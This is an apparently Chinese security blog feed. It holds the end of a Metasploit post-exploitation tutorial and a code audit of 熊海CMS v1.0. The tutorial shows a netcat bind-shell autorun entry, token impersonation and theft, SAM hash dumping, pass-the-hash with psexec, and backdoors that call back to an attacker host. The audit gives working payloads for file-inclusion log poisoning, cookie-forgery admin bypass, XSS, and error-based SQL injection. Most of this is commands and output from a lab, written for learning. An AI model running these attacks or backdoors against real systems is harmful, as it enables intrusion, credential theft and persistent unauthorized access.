HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc</span><br><span class="line">Key: HKLM\software\microsoft\windows\currentversion\Run</span><br><span class="line">Name: lltest_nc</span><br><span class="line">Type: REG_SZ</span><br><span class="line">Data: C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nc 192.168.22.171 443</span><br><span class="line">Microsoft Windows [�汾 6.1.7600]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Windows\SysWOW64&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">win-7\win7</span><br><span class="line"></span><br><span class="line">C:\Windows\SysWOW64&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="令牌操纵">令牌操纵</span></h2><h3><span id="incognito假冒令牌">incognito假冒令牌</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &apos;NT AUTHORITY\SYSTEM&apos;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-7\Administrator</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self if primary process token is SYSTEM</span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">WIN-7\Administrator</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">No tokens available</span><br><span class="line"></span><br><span class="line">meterpreter &gt; impersonate_token &apos;NT AUTHORITY\SYSTEM&apos;</span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self if primary process token is SYSTEM</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">meterpreter &gt; rev2self </span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: WIN-7\Administrator</span><br></pre></td></tr></table></figure>
<h3><span id="steal_token窃取令牌">steal_token窃取令牌</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; steal_token 3416</span><br><span class="line">Stolen token with username: WIN-7\Administrator</span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: WIN-7\Administrator</span><br><span class="line">meterpreter &gt; drop_token </span><br><span class="line">Relinquished token, now running as: WIN-7\Administrator</span><br></pre></td></tr></table></figure>
<h2><span id="哈希利用">哈希利用</span></h2><h3><span id="获取哈希">获取哈希</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/smart_hashdump  #从SAM导出密码哈希</span><br><span class="line">#需要SYSTEM权限</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against WIN-7</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /root/.msf4/loot/20181219014335_default_192.168.22.171_windows.hashes_427821.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*] 	Obtaining the boot key...</span><br><span class="line">[*] 	Calculating the hboot key using SYSKEY 3a0c900d7f8d17e229f42745cc605dfe...</span><br><span class="line">[*] 	Obtaining the user list and keys...</span><br><span class="line">[*] 	Decrypting user keys...</span><br><span class="line">[*] 	Dumping password hints...</span><br><span class="line">[*] 	No users with password hints on this system</span><br><span class="line">[*] 	Dumping password hashes...</span><br><span class="line">[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:45a524862326cb9e7d85af4017a000f0:::</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<h3><span id="psexec哈希传递">PSExec哈希传递</span></h3><p>通过<code>smart_hashdump</code>获取用户哈希后，可以利用<code>psexec</code>模块进行哈希传递攻击<br>前提条件：</p>
<ol>
<li>开启445端口 smb服务</li>
<li>开启admin$共享</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set LHOST 192.168.159.134</span><br><span class="line">msf &gt; set LPORT 443</span><br><span class="line">msf &gt; set RHOST 192.168.159.144</span><br><span class="line">msf &gt;set SMBUser Administrator</span><br><span class="line">msf &gt;set SMBPass aad3b4*****04ee:5b5f00*****c424c</span><br><span class="line">msf &gt;set SMBDomain  WORKGROUP   #域用户需要设置SMBDomain</span><br><span class="line">msf &gt;exploit</span><br></pre></td></tr></table></figure>
<h2><span id="后门植入">后门植入</span></h2><p><code>metasploit</code>自带的后门有两种方式启动的，一种是通过启动项启动(<code>persistence</code>)，一种是通过服务启动(<code>metsvc</code>)，另外还可以通过<code>persistence_exe</code>自定义后门文件。</p>
<h3><span id="persistence启动项后门">persistence启动项后门</span></h3><p>在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本<br>在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 6661 -r 192.168.159.134</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence -X -i 5 -p 6661 -r 192.168.22.170</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WIN-7_20181219.5619/WIN-7_20181219.5619.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.22.170 LPORT=6661</span><br><span class="line">[*] Persistent agent script is 99632 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\ADMINI~1\AppData\Local\Temp\uIMYmofzh.vbs</span><br><span class="line">[*] Executing script C:\Users\ADMINI~1\AppData\Local\Temp\uIMYmofzh.vbs</span><br><span class="line">[+] Agent executed with PID 336</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QXbddoBLcqYjXg</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QXbddoBLcqYjXg</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost 192.168.22.170</span><br><span class="line">lhost =&gt; 192.168.22.170</span><br><span class="line">msf exploit(multi/handler) &gt; set lport 6661</span><br><span class="line">lport =&gt; 6661</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.22.170:6661 </span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.22.171</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.22.170:6661 -&gt; 192.168.22.171:49327) at 2018-12-19 01:57:52 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<h3><span id="metsvc服务后门">metsvc服务后门</span></h3><p>在<code>C:\Users***\AppData\Local\Temp\</code>上传了三个文件（<code>metsrv.x86.dll</code>、<code>metsvc-server.exe</code>、<code>metsvc.exe</code>），通过服务启动，服务名为meterpreter</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –h   # 查看帮助</span><br><span class="line">run metsvc –A   #自动安装后门</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc -A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\ADMINI~1\AppData\Local\Temp\QVRUVXrjfrcMn...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">	 * Installing service metsvc</span><br><span class="line">Cannot create service (0x00000431)</span><br><span class="line"></span><br><span class="line">[*] Trying to connect to the Meterpreter service at 192.168.22.171:31337...</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
<h2><span id="扫描脚本">扫描脚本</span></h2><p>扫描的脚本位于：<br><code>/usr/share/metasploit-framework/modules/auxiliary/scanner/</code><br>扫描的脚本较多，仅列几个代表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/dir_scanner</span><br><span class="line">use auxiliary/scanner/http/jboss_vulnscan</span><br><span class="line">use auxiliary/scanner/mssql/mssql_login</span><br><span class="line">use auxiliary/scanner/mysql/mysql_version</span><br><span class="line">use auxiliary/scanner/oracle/oracle_login</span><br></pre></td></tr></table></figure>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[代码审计3-熊海cms v1.0]]></title>
      <url>https://uknowsec.cn/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A13-%E7%86%8A%E6%B5%B7cms-v1-0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h3><span id="前言">前言</span></h3><p>菜狗子学代码审计，只能挑挑软柿子捏一捏了。MVC框架现在估计是审计不出来，只能找找代码流不仅小一点，小型的CMS下手了。所以找了这一套又老有小的CMS来练练手了，目前还是用<code>seay审计系统</code>先扫描可疑的漏洞点，然后一个一个地去看漏洞涉及的代码，可能菜是原罪吧。</p>
<h3><span id="熊海cms-v10">熊海CMS v1.0</span></h3><h4><span id="任意文件包含">任意文件包含</span></h4><p>在路径<code>/admin/index.php</code>中，有一段入口文件代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//单一入口模式</span><br><span class="line">error_reporting(0); //关闭错误显示</span><br><span class="line">$file=addslashes($_GET[&apos;r&apos;]); //接收文件名</span><br><span class="line">$action=$file==&apos;&apos;?&apos;index&apos;:$file; //判断为空或者等于index</span><br><span class="line">include(&apos;files/&apos;.$action.&apos;.php&apos;); //载入相应文件</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里的变量<code>$_GET[&#39;r&#39;]</code>仅仅用<code>addslashes()</code>函数进行简单的转义，直接进行文件包含，但是在<code>include()</code>函数里拼接了<code>.php</code>后缀。所以必须要上传了<code>.php</code>文件才行。</p>
<p>手动在文件目录下创建<code>1.php</code>,用<code>r=../1</code>包含该文件，但是这个貌似有点鸡肋。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_1.jpg" alt=""></p>
<p>如果满足如下条件，就可以利用<code>%00</code>截断可以进行包含文件进行getshell</p>
<ul>
<li>PHP版本 &lt; 5.3</li>
<li>magic_quotes_gpc = off</li>
<li>没有用addslashes()进行转义处理</li>
</ul>
<p>手动把<code>PHP</code>版本调到<code>5.2.17</code>，并且把<code>magic_quotes_gpc = off</code>,去掉原来代码中的<code>addslashes()</code>函数处理进行文件包含<code>getshell</code>。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_16.jpg" alt=""></p>
<p>另外再修改代码测试一下，把拼接部分的<code>php</code>后缀去掉。然后就可以利用到包含日志文件进行<code>getshell</code>了。</p>
<p><code>Payload:r=../../../Apache/logs/access.log &lt;?php phpinfo(); ?&gt;</code></p>
<p>浏览器会对一些字符进行转义编码，用burp直接发包。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?r=../../../Apache/logs/access.log &lt;?php phpinfo(); ?&gt; HTTP/1.1</span><br><span class="line">Host: xhcms.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_3.jpg" alt=""></p>
<h4><span id="cookie伪造越权访问">cookie伪造越权访问</span></h4><p>在路径<code>\inc\checklogin.php</code>的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$user=$_COOKIE[&apos;user&apos;];</span><br><span class="line">if ($user==&quot;&quot;)&#123;</span><br><span class="line">header(&quot;Location: ?r=login&quot;);</span><br><span class="line">exit;	</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><code>checklogin.php</code>文件用来检查用户的<code>COOKIE</code>,判断仅仅是判断<code>COOKIE</code>是否不为空，所以只要我们伪造任意不为空的<code>COOKIE</code>值就可以跳过后面的重定向了。</p>
<p>在<code>\admin\files</code>目录下的所有的文件都是通过<code>require()</code>函数来包含这个文件进行COOKIE认证的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require &apos;../inc/checklogin.php&apos;;</span><br></pre></td></tr></table></figure>
<p>所以我们可以直接伪造任意不为空的<code>COOKIE</code>值来进行越权访问。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_4.jpg" alt=""></p>
<h4><span id="存储型xss">存储型XSS</span></h4><p>在每个文章下面是可以进行评论的，提交了一下评论表单，用<code>PHPStorm</code>调试跟进。发现评论内容是被过滤了的。</p>
<p>在文件<code>\files\submit.php</code>中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content= addslashes(strip_tags($content));//过滤HTML</span><br></pre></td></tr></table></figure>
<p>但是没有过滤其他的字段，这里仍然可以利用其他字段进行XSS攻击。</p>
<p>利用昵称进行XSS测试。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_5.jpg" alt=""></p>
<p>这里好像把页面的html也插坏了。。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_6.jpg" alt=""></p>
<p>后台管理员界面：</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_7.jpg" alt=""></p>
<h4><span id="反射型xss">反射型XSS</span></h4><p>在路径<code>\files\contact.php</code>中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$page=addslashes($_GET[&apos;page&apos;]);</span><br><span class="line">if ($page&lt;&gt;&quot;&quot;)&#123;</span><br><span class="line">if ($page&lt;&gt;1)&#123;</span><br><span class="line">$pages=&quot;第&quot;.$page.&quot;页 - &quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里的<code>$page</code>是直接仅仅进行了转义，然后直接代入以下的<code>html</code>代码里。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&gt;第 &lt;?php echo $page?&gt; - &lt;?php echo $Totalpage?&gt; 页 共 &lt;?php echo $Total?&gt; 条&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>所以可以XSS。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_8.jpg" alt=""></p>
<h4><span id="前台多处报错注入">前台多处报错注入</span></h4><h5><span id="filessoftwarephp报错注入">\files\software.php报错注入</span></h5><p>在路径<code>\files\software.php</code>如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM settings&quot;;</span><br><span class="line">$resul = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$info = mysql_fetch_array($resul);</span><br><span class="line">$id=addslashes($_GET[&apos;cid&apos;]);</span><br><span class="line">$query = &quot;SELECT * FROM download WHERE id=&apos;$id&apos;&quot;;</span><br><span class="line">$resul = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$download = mysql_fetch_array($resul);</span><br><span class="line"></span><br><span class="line">//浏览计数</span><br><span class="line">$query = &quot;UPDATE download SET hit = hit+1 WHERE id=$id&quot;;</span><br><span class="line">@mysql_query($query) or die(&apos;修改错误：&apos;.mysql_error());</span><br></pre></td></tr></table></figure>
<p>这里的<code>cid</code>变量通过<code>GET</code>请求提交，然后通过一个<code>addslashes()</code>函数进行简单的转义，这样对注入是没有防护作用的。所以可以直接进行注入，这里是通过<code>die(&#39;SQL语句有误：&#39;.mysql_error());</code>输出报错信息，所以是属于报错注入。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_10.jpg" alt=""></p>
<h5><span id="filescontentphp报错注入">\files\content.php报错注入</span></h5><p>在路径<code>\files\content.php</code>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM settings&quot;;</span><br><span class="line">$resul = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$info = mysql_fetch_array($resul);</span><br><span class="line"></span><br><span class="line">$id=addslashes($_GET[&apos;cid&apos;]);</span><br><span class="line">$query = &quot;SELECT * FROM content WHERE id=&apos;$id&apos;&quot;;</span><br><span class="line">$resul = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$content = mysql_fetch_array($resul);</span><br><span class="line"></span><br><span class="line">$navid=$content[&apos;navclass&apos;];</span><br><span class="line">$query = &quot;SELECT * FROM navclass WHERE id=&apos;$navid&apos;&quot;;</span><br><span class="line">$resul = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$navs = mysql_fetch_array($resul);</span><br></pre></td></tr></table></figure>
<p>这里的<code>cid</code>变量跟<code>\files\software.php</code>是一样的。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_11.jpg" alt=""></p>
<h5><span id="filessubmitphp报错注入">\files\submit.php报错注入</span></h5><p>在<code>\files\submit.php</code>路径下，有几处SQL注入，有跟前面一样的<code>cid</code>变量，另外还有下面的<code>mail</code>变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM interaction WHERE( mail = &apos;$mail&apos;)&quot;;</span><br><span class="line">$result = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$tx = mysql_fetch_array($result);</span><br><span class="line">if (!mysql_num_rows($result))&#123;  </span><br><span class="line">$touxiang = mt_rand(1,100);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$touxiang = $tx[&apos;touxiang&apos;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>mail</code>变量是POST提交的，没有经过任何过滤，闭合单引号和括号。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;) and (updatexml(1,concat(0x7e,(select user()),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>在评论处，添加评论并在邮箱处插入payload。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_12.jpg" alt=""></p>
<p>提交返回报错信息。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_13.jpg" alt=""></p>
<h4><span id="后台报错注入">后台报错注入</span></h4><h5><span id="adminfileswzlistphp报错注入">\admin\files\wzlist.php报错注入</span></h5><p>后台也有不少可以进行报错注入的点，这里有一处是利用到<code>delete</code>语句的。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$delete=$_GET[&apos;delete&apos;];</span><br><span class="line">if ($delete&lt;&gt;&quot;&quot;)&#123;</span><br><span class="line">$query = &quot;DELETE FROM content WHERE id=&apos;$delete&apos;&quot;;</span><br><span class="line">$result = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">echo &quot;&lt;script&gt;alert(&apos;亲，ID为&quot;.$delete.&quot;的内容已经成功删除！&apos;);location.href=&apos;?r=wzlist&apos;&lt;/script&gt;&quot;;</span><br><span class="line">exit; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接闭合单引号就可以了，这里也没对单引号进行转义的。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_17.jpg" alt="">后台的注入在这cms里来看并不是很鸡肋，因为我们结合前面得到的<code>cookie伪造越权访问</code>在没有管理员账号密码的情况下进行注入。例如：</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_18.jpg" alt=""></p>
<h5><span id="adminfilesnewlinkphp报错注入">\admin\files\newlink.php报错注入</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$save=$_POST[&apos;save&apos;];</span><br><span class="line">$name=$_POST[&apos;name&apos;];</span><br><span class="line">$url=$_POST[&apos;url&apos;];</span><br><span class="line">$mail=$_POST[&apos;mail&apos;];</span><br><span class="line">$jieshao=$_POST[&apos;jieshao&apos;];</span><br><span class="line">$xs=$_POST[&apos;xs&apos;];</span><br><span class="line">$query = &quot;INSERT INTO link (name,url,mail,jieshao,xs,date) VALUES (&apos;$name&apos;,&apos;$url&apos;,&apos;$mail&apos;,&apos;jieshao&apos;,&apos;xs&apos;,now())&quot;;</span><br><span class="line">@mysql_query($query) or die(&apos;新增错误：&apos;.mysql_error());</span><br><span class="line">echo &quot;&lt;script&gt;alert(&apos;亲爱的，链接已经成功添加。&apos;);location.href=&apos;?r=linklist&apos;&lt;/script&gt;&quot;; </span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是一个利用<code>insert</code>的报错注入，同样在页面添加友情链接。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or  (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or&apos;</span><br></pre></td></tr></table></figure>
